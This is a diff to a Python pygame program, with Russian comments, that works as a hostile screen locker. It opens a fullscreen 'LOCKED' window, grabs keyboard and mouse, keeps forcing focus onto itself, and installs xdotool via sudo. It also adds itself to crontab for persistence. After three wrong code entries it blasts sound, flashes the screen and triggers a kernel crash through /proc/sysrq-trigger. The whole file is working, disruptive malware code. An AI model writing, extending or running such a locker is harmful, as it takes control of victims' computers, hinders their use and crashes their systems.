@@ -3,6 +3,16 @@ import os, sys, time, threading, subprocess, shlex
 import pygame
 from pygame.locals import *
 
+# ---------- проверка/установка xdotool ----------
+def ensure_xdotool():
+    try:
+        subprocess.check_call(["which", "xdotool"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        print("Устанавливаю xdotool...")
+        subprocess.call(["sudo", "apt", "install", "-y", "xdotool"])
+
+ensure_xdotool()
+
 # ---------- автозагрузка ----------
 def add_to_crontab():
     script_path = os.path.abspath(__file__)
@@ -16,49 +26,22 @@ def add_to_crontab():
             f.write(existing.strip() + "\n" + cmd + "\n")
         subprocess.call(["crontab", "/tmp/crontab_new"])
         os.unlink("/tmp/crontab_new")
+        print("[+] Добавлено в автозагрузку.")
 
-# ---------- захват ввода ----------
-def hard_grab():
-    try:
-        import Xlib.display
-        d = Xlib.display.Display()
-        root = d.screen().root
-        root.grab_keyboard(True, Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync,
-                           Xlib.X.CurrentTime)
-        root.grab_pointer(True, Xlib.X.ButtonPressMask | Xlib.X.ButtonReleaseMask | Xlib.X.PointerMotionMask,
-                          Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync, Xlib.X.NONE, Xlib.X.NONE, Xlib.X.CurrentTime)
-        d.sync()
-        Xlib.X.AllowEvents(d, Xlib.X.AsyncKeyboard, Xlib.X.CurrentTime)
-        Xlib.X.AllowEvents(d, Xlib.X.AsyncPointer, Xlib.X.CurrentTime)
-    except Exception as e:
-        print("Ошибка захвата:", e)
-
-# ---------- удержание фокуса ----------
+# ---------- принудительный фокус (блокирует переключение) ----------
 def force_focus():
-    try:
-        import Xlib.display
-        d = Xlib.display.Display()
-        root = d.screen().root
-        win_id = None
-        for win in root.query_tree().children:
-            name = win.get_wm_name()
-            if name == "LOCKED":
-                win_id = win
-                break
-        if win_id:
-            while True:
-                win_id.set_input_focus(Xlib.X.RevertToParent, Xlib.X.CurrentTime)
-                d.sync()
-                time.sleep(0.1)
-    except:
-        pass
+    while True:
+        # Активируем окно по имени "LOCKED"
+        subprocess.call(["xdotool", "search", "--name", "LOCKED", "windowactivate"],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(0.1)
 
-# ---------- звук ----------
+# ---------- звук (громкий крик) ----------
 def play_sound():
     subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
     subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)
 
-# ---------- kernel panic ----------
+# ---------- Kernel Panic ----------
 def panic():
     with open("/proc/sysrq-trigger", "w") as f:
         f.write("c")
@@ -69,7 +52,7 @@ MAX_ATTEMPTS = 3
 attempts_left = MAX_ATTEMPTS
 input_buffer = ""
 
-# ---------- pygame ----------
+# ---------- Pygame ----------
 pygame.init()
 info = pygame.display.Info()
 screen = pygame.display.set_mode((info.current_w, info.current_h),
@@ -77,16 +60,19 @@ screen = pygame.display.set_mode((info.current_w, info.current_h),
 pygame.display.set_caption("LOCKED")
 pygame.mouse.set_visible(False)
 
-# Даём окну время появиться
-time.sleep(0.5)
+# Захват ввода (мышь + клавиатура) в окне
+pygame.event.set_grab(True)
 
-# Захват и фокус
-hard_grab()
+# Запускаем поток, который держит фокус
 threading.Thread(target=force_focus, daemon=True).start()
 
+# Шрифты
 font = pygame.font.SysFont("monospace", 28, bold=True)
 font_small = pygame.font.SysFont("monospace", 22)
-BLACK = (0,0,0); GREEN = (0,255,0); RED = (255,0,0); WHITE = (255,255,255)
+BLACK = (0, 0, 0)
+GREEN = (0, 255, 0)
+RED   = (255, 0, 0)
+WHITE = (255, 255, 255)
 
 def draw():
     screen.fill(BLACK)
@@ -103,8 +89,10 @@ def draw():
         screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
     pygame.display.flip()
 
+# Добавляем в автозагрузку
 add_to_crontab()
 
+# ---------- главный цикл ----------
 running = True
 draw()
 while running:
@@ -122,20 +110,26 @@ while running:
                         draw()
                         threading.Thread(target=play_sound, daemon=True).start()
                         for i in range(10):
-                            color = RED if i%2==0 else WHITE
-                            screen.fill(color); pygame.display.flip(); time.sleep(0.1)
-                        screen.fill(BLACK); pygame.display.flip()
+                            color = RED if i % 2 == 0 else WHITE
+                            screen.fill(color)
+                            pygame.display.flip()
+                            time.sleep(0.1)
+                        screen.fill(BLACK)
+                        pygame.display.flip()
                         threading.Timer(5.0, panic).start()
                         running = False
                     else:
                         draw()
             elif event.key == K_BACKSPACE:
-                input_buffer = input_buffer[:-1]; draw()
-            elif event.key in (K_0,K_1,K_2,K_3,K_4,K_5,K_6,K_7,K_8,K_9):
+                input_buffer = input_buffer[:-1]
+                draw()
+            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
                 if len(input_buffer) < 4:
-                    input_buffer += chr(event.key); draw()
+                    input_buffer += chr(event.key)
+                    draw()
         if event.type == QUIT:
             pass
 
+# Если вышли – висеть
 while True:
     time.sleep(1)
